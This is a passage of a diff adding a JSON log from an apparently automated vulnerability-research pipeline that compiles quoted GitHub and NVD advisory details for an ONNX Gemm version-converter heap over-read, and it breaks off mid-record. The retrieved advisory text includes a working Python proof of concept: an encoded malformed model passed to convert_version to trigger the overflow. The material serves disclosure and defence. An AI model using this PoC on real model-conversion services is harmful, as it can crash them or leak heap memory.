+            "opset_downgrade",
+            "input_rank",
+            "unchecked_index",
+            "boundary_release_asan"
+          ],
+          "note": "已有CVE标识与NVD厂商/产品字段，但缺GitHub packages范围、首次修复版本及NVD版本措辞、触发API、opset降级、rank条件、未检查索引、InferShapes边界与Release/ASan差异。先读取GitHub公告事件f147dbc7的packages与description字段。"
+        },
+        {
+          "cycle": 0,
+          "call_id": "research:0:1",
+          "action": "tool",
+          "tool_name": "read_fields",
+          "arguments": {
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "fields": [
+              "description"
+            ],
+            "limit": 4
+          },
+          "task_ids": [
+            "nvd_version_wording"
+          ],
+          "note": "GitHub公告已给出pip范围>=1.3.0,<=1.21.0、首次修复1.22.0、触发API convert_version(model,6)、opset 7→6降级、B_shape[1]未检查索引、rank<2条件、InferShapes边界及Release/ASan差异。尚缺NVD版本措辞，读取NVD事件7bf577f3的description字段。"
+        }
+      ],
+      "verification": {
+        "coverage": [
+          {
+            "task_id": "gh_pip_range",
+            "status": "covered",
+            "statement_indices": [
+              1
+            ],
+            "note": "Statement 1 quotes the GitHub packages field showing pip vulnerable_version_range >= 1.3.0, <= 1.21.0."
+          },
+          {
+            "task_id": "gh_first_patched",
+            "status": "covered",
+            "statement_indices": [
+              2
+            ],
+            "note": "Statement 2 quotes the same packages field showing first_patched_version 1.22.0."
+          },
+          {
+            "task_id": "nvd_version_wording",
+            "status": "covered",
+            "statement_indices": [
+              3
+            ],
+            "note": "Statement 3 quotes NVD description wording: From 1.3.0 until 1.22.0, fixed in version 1.22.0."
+          },
+          {
+            "task_id": "trigger_api",
+            "status": "covered",
+            "statement_indices": [
+              3,
+              4
+            ],
+            "note": "Statement 3 quotes convert_version() and Gemm_7_6::adapt_gemm_7_6(); statement 4 quotes entry point onnx.version_converter.convert_version(model, 6)."
+          },
+          {
+            "task_id": "opset_downgrade",
+            "status": "covered",
+            "statement_indices": [
+              3,
+              4
+            ],
+            "note": "Statement 3 quotes opset 7 to 6 downgrade; statement 4 quotes opset downgrade (7→6)."
+          },
+          {
+            "task_id": "input_rank",
+            "status": "covered",
+            "statement_indices": [
+              3,
+              5
+            ],
+            "note": "Statement 3 quotes fewer than two dimensions; statement 5 quotes fewer than 2 dimensions and PoC B shape [28] (1 dimension)."
+          },
+          {
+            "task_id": "unchecked_index",
+            "status": "covered",
+            "statement_indices": [
+              3,
+              5,
+              6
+            ],
+            "note": "Statement 3 quotes B_shape[1], A_shape[0], A_shape[1] accessed without rank check; statements 5 and 6 quote the unchecked B_shape[1] and A_shape[0]/A_shape[1] pattern."
+          },
+          {
+            "task_id": "boundary_release_asan",
+            "status": "covered",
+            "statement_indices": [
+              4,
+              7,
+              8
+            ],
+            "note": "Statement 4 quotes different from InferShapes bugs; statement 7 quotes Release silent/propagation/leak and ASan heap-buffer-overflow/crash; statement 8 quotes ASan details."
+          }
+        ],
+        "unsupported": [],
+        "gaps": []
+      },
+      "supplement_cycles": 0,
+      "ai_quote_review": {
+        "status": "completed",
+        "scope": "actual_attached_quotes_only",
+        "independent_gold": false,
+        "human_review": false
+      },
+      "candidate_statement_origins": [
+        {
+          "statement_index": 1,
+          "text": "GitHub 公告的 packages 字段显示，ONNX 的 pip 受影响版本范围为 >= 1.3.0, <= 1.21.0。",
+          "evidence_ids": [
+            "e4e55de0e4e38673c5ba7293:65c126157dc5"
+          ],
+          "retained": true
+        },
+        {
+          "statement_index": 2,
+          "text": "GitHub 公告 packages 字段中 ONNX 的 first_patched_version 为 1.22.0。",
+          "evidence_ids": [
+            "e4e55de0e4e38673c5ba7293:65c126157dc5"
+          ],
+          "retained": true
+        },
+        {
+          "statement_index": 3,
+          "text": "NVD 描述称：从 1.3.0 直到 1.22.0，onnx.version_converter.convert_version() 在 Gemm_7_6::adapt_gemm_7_6() 中可能发生越界读取，该问题在 1.22.0 版本修复。",
+          "evidence_ids": [
+            "6e1faf79a36f22ab1028c508:8b2957ec5dc4"
+          ],
+          "retained": true
+        },
+        {
+          "statement_index": 4,
+          "text": "触发入口为 onnx.version_converter.convert_version(model, 6)，在 opset 7→6 降级期间触发，与其它公告中的 InferShapes 缺陷不同。",
+          "evidence_ids": [
+            "84dc8e1448a002bd2be53f79:154e52aea63a"
+          ],
+          "retained": true
+        },
+        {
+          "statement_index": 5,
+          "text": "当 Gemm 节点的输入张量维度少于 2 时，适配器访问 B_shape[1] 而未检查 rank；PoC 的输入 B 形状为 [28]（1 维），B_shape 只有 1 个元素，访问 B_shape[1] 会读取越过 std::vector<Dimension> 内部存储 16 字节进入相邻堆内存。",
+          "evidence_ids": [
+            "396c2627bdb5e48fa4139bb9:5e0f4ce28f2c",
+            "84dc8e1448a002bd2be53f79:154e52aea63a"
+          ],
+          "retained": true
+        },
+        {
+          "statement_index": 6,
+          "text": "同样的未检查模式也适用于第 34、36 行的 A_shape[0] 和 A_shape[1]。",
+          "evidence_ids": [
+            "84dc8e1448a002bd2be53f79:154e52aea63a"
+          ],
+          "retained": true
+        },
+        {
+          "statement_index": 7,
+          "text": "在 Release 构建上该越界读取是静默的，读取值会传播到转换后模型的输出形状，可能泄露堆数据；在 ASan 构建上被检测为 heap-buffer-overflow，不同堆布局下也可能导致崩溃。",
+          "evidence_ids": [
+            "f8b8de8ba602a5c6502ed1ea:88d3e8a56cac"
+          ],
+          "retained": true
+        },
+        {
+          "statement_index": 8,
+          "text": "ASan 确认：在 gemm_7_6.h:41 处 heap-buffer-overflow READ of size 16，位于 tensorShapeProtoToDimensions（ir_pb_converter.cc:216）分配的 48 字节区域之后 0 字节处。",
+          "evidence_ids": [
+            "f8b8de8ba602a5c6502ed1ea:88d3e8a56cac"
+          ],
+          "retained": true
+        }
+      ],
+      "model_calls": [
+        {
+          "attempt": 1,
+          "status": "completed",
+          "billed_at": 1791870442,
+          "call_id": "planner:0",
+          "elapsed_ms": 2900.965,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "626671f331ab88b69df8247b724ac1bf0c0f843676722c435fe2ca22069171d9",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "ad6e4af8-7cd7-460c-bffa-d81aabc03189",
+          "requested_at": "2026-10-13T05:47:21.862433+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "planner",
+          "usage": {
+            "completion_tokens": 544,
+            "prompt_cache_hit_tokens": 768,
+            "prompt_cache_miss_tokens": 177,
+            "prompt_tokens": 945,
+            "total_tokens": 1489
+          }
+        },
+        {
+          "attempt": 2,
+          "status": "completed",
+          "billed_at": 1791870445,
+          "call_id": "research:0:0",
+          "elapsed_ms": 1631.722,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "82ebbe674f404ffc73dc1a44487146b529e544faa6fe26cf525c44765a876bc7",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "8682a91c-a48e-4cb2-9dff-179efb8377a5",
+          "requested_at": "2026-10-13T05:47:24.781174+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "researcher",
+          "usage": {
+            "completion_tokens": 190,
+            "prompt_cache_hit_tokens": 3072,
+            "prompt_cache_miss_tokens": 1477,
+            "prompt_tokens": 4549,
+            "total_tokens": 4739
+          }
+        },
+        {
+          "attempt": 3,
+          "status": "completed",
+          "billed_at": 1791870447,
+          "call_id": "research:0:1",
+          "elapsed_ms": 1245.016,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "67faefa5beb50d3dbeb56168a95f33ecbdcbbb751e9371514ab259da0e20c757",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "411d9a7e-429a-48e8-a019-9e404c9078fd",
+          "requested_at": "2026-10-13T05:47:26.967412+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "researcher",
+          "usage": {
+            "completion_tokens": 168,
+            "prompt_cache_hit_tokens": 3072,
+            "prompt_cache_miss_tokens": 4315,
+            "prompt_tokens": 7387,
+            "total_tokens": 7555
+          }
+        },
+        {
+          "attempt": 4,
+          "status": "completed",
+          "billed_at": 1791870448,
+          "call_id": "compose:0",
+          "elapsed_ms": 3928.85,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "71993c8c13567c543cdfd4866e4e6bfd63fe4913d8e7620f36492e69030504ed",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "b669febe-dd79-4fbd-bd4f-ccd03ac2c9f2",
+          "requested_at": "2026-10-13T05:47:28.232082+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "composer",
+          "usage": {
+            "completion_tokens": 973,
+            "prompt_cache_hit_tokens": 384,
+            "prompt_cache_miss_tokens": 8206,
+            "prompt_tokens": 8590,
+            "total_tokens": 9563
+          }
+        },
+        {
+          "attempt": 5,
+          "status": "completed",
+          "billed_at": 1791870452,
+          "call_id": "verify:0",
+          "elapsed_ms": 2453.97,
+          "finish_reason": "stop",
+          "http_requests": 1,
+          "http_status": 200,
+          "input_sha256": "ca44ceba3795b031c562c65d257eb2d9d3adf66b40102b40534549ad5174f301",
+          "model": "deepseek-v4-flash",
+          "provider": "deepseek",
+          "provider_response_id": "9d7dd66c-3651-44e2-ab2f-3ff8ba7ccd24",
+          "requested_at": "2026-10-13T05:47:32.173469+00:00",
+          "returned_model": "deepseek-flash",
+          "role": "verifier",
+          "usage": {
+            "completion_tokens": 477,
+            "prompt_cache_hit_tokens": 896,
+            "prompt_cache_miss_tokens": 5193,
+            "prompt_tokens": 6089,
+            "total_tokens": 6566
+          }
+        }
+      ],
+      "tool_results": [
+        {
+          "status": "completed",
+          "tool": "retrieve",
+          "result": {
+            "items": [
+              {
+                "citation": {
+                  "chunk_id": "4bb223fe30f3bcd3e9f5ec4d",
+                  "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+                  "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+                  "revision": 1,
+                  "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+                  "json_pointer": "/vulnerabilities/0/cve/affected/0/affectedData/0/vendor",
+                  "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+                  "field": "nvd_affected_data_0_0_vendor",
+                  "start": 0,
+                  "end": 4,
+                  "external_id": "CVE-2026-63632",
+                  "source_id": "nvd",
+                  "origin": "live",
+                  "title": "CVE-2026-63632",
+                  "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "4bb223fe30f3bcd3e9f5ec4d",
+                    "base_start": 0,
+                    "base_end": 4,
+                    "source_field_sha256": "87e93f89f2be0db364e8be052f79f389e6c2da239831922e24513288af522a43",
+                    "source_field_chars": 4,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "field",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "title": "CVE-2026-63632",
+                "text": "onnx",
+                "text_truncated": false,
+                "rank_score_not_confidence": 0.044562,
+                "evidence_id": "4bb223fe30f3bcd3e9f5ec4d:87e93f89f2be",
+                "quote_policy": "server_fills_verified_span"
+              },
+              {
+                "citation": {
+                  "chunk_id": "2f4b849cfa87b93a426cdd04",
+                  "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+                  "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+                  "revision": 1,
+                  "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+                  "json_pointer": "/1/cve_id",
+                  "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+                  "field": "cve_id",
+                  "start": 0,
+                  "end": 14,
+                  "external_id": "GHSA-p893-rvq9-2xf9",
+                  "source_id": "github-advisories",
+                  "origin": "live",
+                  "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+                  "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "2f4b849cfa87b93a426cdd04",
+                    "base_start": 0,
+                    "base_end": 14,
+                    "source_field_sha256": "234284bef23c14b63be35f453959ffab13a4f4992dcf51d653057a6184ace421",
+                    "source_field_chars": 14,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "field",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+                "text": "CVE-2026-63632",
+                "text_truncated": false,
+                "rank_score_not_confidence": 0.043363,
+                "evidence_id": "2f4b849cfa87b93a426cdd04:234284bef23c",
+                "quote_policy": "server_fills_verified_span"
+              },
+              {
+                "citation": {
+                  "chunk_id": "7d8332bd85c583e88ec6859b",
+                  "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+                  "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+                  "revision": 1,
+                  "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+                  "json_pointer": "/vulnerabilities/0/cve/affected/0/affectedData/0/product",
+                  "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+                  "field": "nvd_affected_data_0_0_product",
+                  "start": 0,
+                  "end": 4,
+                  "external_id": "CVE-2026-63632",
+                  "source_id": "nvd",
+                  "origin": "live",
+                  "title": "CVE-2026-63632",
+                  "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "7d8332bd85c583e88ec6859b",
+                    "base_start": 0,
+                    "base_end": 4,
+                    "source_field_sha256": "87e93f89f2be0db364e8be052f79f389e6c2da239831922e24513288af522a43",
+                    "source_field_chars": 4,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "field",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "title": "CVE-2026-63632",
+                "text": "onnx",
+                "text_truncated": false,
+                "rank_score_not_confidence": 0.044538,
+                "evidence_id": "7d8332bd85c583e88ec6859b:87e93f89f2be",
+                "quote_policy": "server_fills_verified_span"
+              },
+              {
+                "citation": {
+                  "chunk_id": "d5c013abe7b5abd3fc6675c7",
+                  "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+                  "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+                  "revision": 1,
+                  "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+                  "json_pointer": "/vulnerabilities/0/cve/id",
+                  "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+                  "field": "cve_id",
+                  "start": 0,
+                  "end": 14,
+                  "external_id": "CVE-2026-63632",
+                  "source_id": "nvd",
+                  "origin": "live",
+                  "title": "CVE-2026-63632",
+                  "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "d5c013abe7b5abd3fc6675c7",
+                    "base_start": 0,
+                    "base_end": 14,
+                    "source_field_sha256": "234284bef23c14b63be35f453959ffab13a4f4992dcf51d653057a6184ace421",
+                    "source_field_chars": 14,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "field",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "title": "CVE-2026-63632",
+                "text": "CVE-2026-63632",
+                "text_truncated": false,
+                "rank_score_not_confidence": 0.044109,
+                "evidence_id": "d5c013abe7b5abd3fc6675c7:234284bef23c",
+                "quote_policy": "server_fills_verified_span"
+              },
+              {
+                "citation": {
+                  "chunk_id": "8560b70c3c2ac5a4e94c589f",
+                  "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+                  "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+                  "revision": 1,
+                  "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
+                  "json_pointer": "/vulnerabilities/0/cve/id",
+                  "sha256": "05f9f5129995ad0e7953e5f863976e974a5d18b0e0fe89ae3846b4192ffdb0ed",
+                  "field": "external_id",
+                  "start": 0,
+                  "end": 14,
+                  "external_id": "CVE-2026-63632",
+                  "source_id": "nvd",
+                  "origin": "live",
+                  "title": "CVE-2026-63632",
+                  "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2026-63632",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "8560b70c3c2ac5a4e94c589f",
+                    "base_start": 0,
+                    "base_end": 14,
+                    "source_field_sha256": "234284bef23c14b63be35f453959ffab13a4f4992dcf51d653057a6184ace421",
+                    "source_field_chars": 14,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "field",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "title": "CVE-2026-63632",
+                "text": "CVE-2026-63632",
+                "text_truncated": false,
+                "rank_score_not_confidence": 0.043822,
+                "evidence_id": "8560b70c3c2ac5a4e94c589f:234284bef23c",
+                "quote_policy": "server_fills_verified_span"
+              }
+            ],
+            "mode": "hybrid",
+            "scope": {
+              "pool": "formal",
+              "origin": "live"
+            },
+            "retrieval": {
+              "query_policy": {
+                "version": "bilingual-security-query-v2",
+                "original": "CVE-2026-63632 对照 ONNX 的 GitHub 与 NVD 公告，分别给出原始 pip 范围、首次修复版本及 NVD 的版本措辞。说明触发 API 和 opset 降级路径、输入 rank 条件、未检查的索引、与 InferShapes 问题的边界，并区分 Release 与 ASan 的表现及可能影响，所有结论引用原文，不执行 PoC。",
+                "search_text": "onnx cve-2026-63632",
+                "facets": [],
+                "identities": [
+                  "onnx"
+                ],
+                "unresolved_entities": [
+                  "api",
+                  "asan",
+                  "github",
+                  "infershapes",
+                  "nvd",
+                  "opset",
+                  "pip",
+                  "poc",
+                  "rank",
+                  "release"
+                ],
+                "identifiers": [
+                  "cve-2026-63632"
+                ],
+                "ambiguous": false,
+                "identifier_anchored": true
+              },
+              "original_query": "CVE-2026-63632 对照 ONNX 的 GitHub 与 NVD 公告，分别给出原始 pip 范围、首次修复版本及 NVD 的版本措辞。说明触发 API 和 opset 降级路径、输入 rank 条件、未检查的索引、与 InferShapes 问题的边界，并区分 Release 与 ASan 的表现及可能影响，所有结论引用原文，不执行 PoC。",
+              "mode": "hybrid",
+              "scanned_chunks": 17,
+              "embedding_calls": 1,
+              "model": "sentence-transformers/all-MiniLM-L6-v2",
+              "model_digest": "546177efd53c466b176e9a51e76e73e11d4bdbab28a33f09c3d3dea4a4479f83",
+              "reranker": "rrf60-cosine-v1",
+              "threshold": 0.35
+            },
+            "independent_verification": false,
+            "whole_spans_omitted_by_budget": 0
+          }
+        },
+        {
+          "status": "completed",
+          "tool": "read_fields",
+          "result": {
+            "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+            "fields": [
+              {
+                "citation": {
+                  "chunk_id": "e4e55de0e4e38673c5ba7293",
+                  "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+                  "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+                  "revision": 1,
+                  "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+                  "json_pointer": "/1/vulnerabilities",
+                  "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+                  "field": "packages",
+                  "start": 0,
+                  "end": 165,
+                  "external_id": "GHSA-p893-rvq9-2xf9",
+                  "source_id": "github-advisories",
+                  "origin": "live",
+                  "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+                  "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "e4e55de0e4e38673c5ba7293",
+                    "base_start": 0,
+                    "base_end": 165,
+                    "source_field_sha256": "65c126157dc53d9a43d4b0515467de6b1f00a8bf897e73cefafb86ddec3391c2",
+                    "source_field_chars": 165,
+                    "serialization": "json-sorted-default-v1",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "field",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "text": "[{\"first_patched_version\": \"1.22.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"onnx\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.3.0, <= 1.21.0\"}]",
+                "text_truncated": false,
+                "evidence_id": "e4e55de0e4e38673c5ba7293:65c126157dc5",
+                "quote_policy": "server_fills_verified_span"
+              },
+              {
+                "citation": {
+                  "chunk_id": "396c2627bdb5e48fa4139bb9",
+                  "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+                  "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+                  "revision": 1,
+                  "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+                  "json_pointer": "/1/description",
+                  "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+                  "field": "description",
+                  "start": 0,
+                  "end": 901,
+                  "external_id": "GHSA-p893-rvq9-2xf9",
+                  "source_id": "github-advisories",
+                  "origin": "live",
+                  "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+                  "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "396c2627bdb5e48fa4139bb9",
+                    "base_start": 0,
+                    "base_end": 900,
+                    "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+                    "source_field_chars": 2484,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "sentences",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "text": "### Summary\n\nHeap-buffer-overflow READ (16 bytes) in `Gemm_7_6::adapt_gemm_7_6()` (`onnx/version_converter/adapters/gemm_7_6.h:41`) when `ConvertVersion()` processes a model with a Gemm node whose input tensors have fewer than 2 dimensions. The adapter accesses `B_shape[1]` without checking rank. On Release builds the OOB read is silent; ASan confirms 16-byte read past a 48-byte allocation.\n\n### Details\n\nThe Gemm 7→6 downgrade adapter reads input shapes without bounds checking:\n```cpp\n// gemm_7_6.h:26-42\nconst auto& A_shape = inputs[0]->sizes();  // May have < 2 elements\nconst auto& B_shape = inputs[1]->sizes();  // May have < 2 elements\n\nif (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension).",
+                "text_truncated": false,
+                "evidence_id": "396c2627bdb5e48fa4139bb9:5e0f4ce28f2c",
+                "quote_policy": "server_fills_verified_span"
+              },
+              {
+                "citation": {
+                  "chunk_id": "84dc8e1448a002bd2be53f79",
+                  "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+                  "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+                  "revision": 1,
+                  "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+                  "json_pointer": "/1/description",
+                  "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+                  "field": "description",
+                  "start": 647,
+                  "end": 1717,
+                  "external_id": "GHSA-p893-rvq9-2xf9",
+                  "source_id": "github-advisories",
+                  "origin": "live",
+                  "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+                  "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "84dc8e1448a002bd2be53f79",
+                    "base_start": 780,
+                    "base_end": 1680,
+                    "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+                    "source_field_chars": 2484,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "sentences",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "text": "if (node->hasAttribute(ktransB) && node->i(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has < 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector<Dimension>` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))",
+                "text_truncated": false,
+                "evidence_id": "84dc8e1448a002bd2be53f79:154e52aea63a",
+                "quote_policy": "server_fills_verified_span"
+              },
+              {
+                "citation": {
+                  "chunk_id": "f8b8de8ba602a5c6502ed1ea",
+                  "event_id": "f147dbc7-ddc8-4d8b-a827-a609fda04dbc",
+                  "revision_id": "e6a5afec-4c63-4c68-a01e-93941e1628be",
+                  "revision": 1,
+                  "raw_document_id": "fa0a65cd-172f-4409-a610-ce7048377da8",
+                  "json_pointer": "/1/description",
+                  "sha256": "6bed1840ea55feb5812cbb188728069cfa403fdc15aa83864ec1b81b6c8e2a4c",
+                  "field": "description",
+                  "start": 1399,
+                  "end": 2484,
+                  "external_id": "GHSA-p893-rvq9-2xf9",
+                  "source_id": "github-advisories",
+                  "origin": "live",
+                  "title": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+                  "source_url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9",
+                  "span_provenance": {
+                    "version": "source-span-v1",
+                    "base_chunk_id": "f8b8de8ba602a5c6502ed1ea",
+                    "base_start": 1560,
+                    "base_end": 2460,
+                    "source_field_sha256": "f8a843881cf5b535497dc7138e1b203c24f97da7316e8aa1171d5ec4910ee40d",
+                    "source_field_chars": 2484,
+                    "serialization": "string-verbatim",
+                    "offset_unit": "unicode_codepoint",
+                    "selection_kind": "sentences",
+                    "boundary_complete": true,
+                    "max_chars": 1200,
+                    "contains": null
+                  }
+                },
+                "text": "poc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# Triggers heap-buffer-overflow in Gemm_7_6 adapter\nversion_converter.convert_version(model, 6)\n```\n\n186-byte PoC. ASan confirms: `heap-buffer-overflow READ of size 16` at `gemm_7_6.h:41`, `0 bytes after 48-byte region` allocated in `tensorShapeProtoToDimensions` at `ir_pb_converter.cc:216`.\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-downgrade opset versions for compatibility. On Release builds the OOB read is silent — the read value propagates into the converted model's output shape, potentially leaking heap data. On ASan builds it's detected as a heap-buffer-overflow. Could also cause crashes with different heap layouts.",
+                "text_truncated": false,
+                "evidence_id": "f8b8de8ba602a5c6502ed1ea:88d3e8a56cac",
+                "quote_policy": "server_fills_verified_span"
+              }
+            ],
+            "matching_chunks": 5,
+            "more_available": true,
+            "next_offsets": {
+              "packages": 165,
+              "description": 2460
+            },
+            "fields_are_excerpts": true,
+            "source_asserted_not_independent_verified": true,
+            "whole_spans_omitted_by_budget": 0
+          }
+        },
+        {
+          "status": "completed",
+          "tool": "read_fields",
+          "result": {
+            "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+            "fields": [
+              {
+                "citation": {
+                  "chunk_id": "6e1faf79a36f22ab1028c508",
+                  "event_id": "7bf577f3-cd5b-4452-a175-b3e60ff9a7c6",
+                  "revision_id": "f1b22ef7-f7c0-48cf-8fc7-00410a2b95de",
+                  "revision": 1,
+                  "raw_document_id": "fe3aec9a-835e-456d-a875-c69bc622d0de",
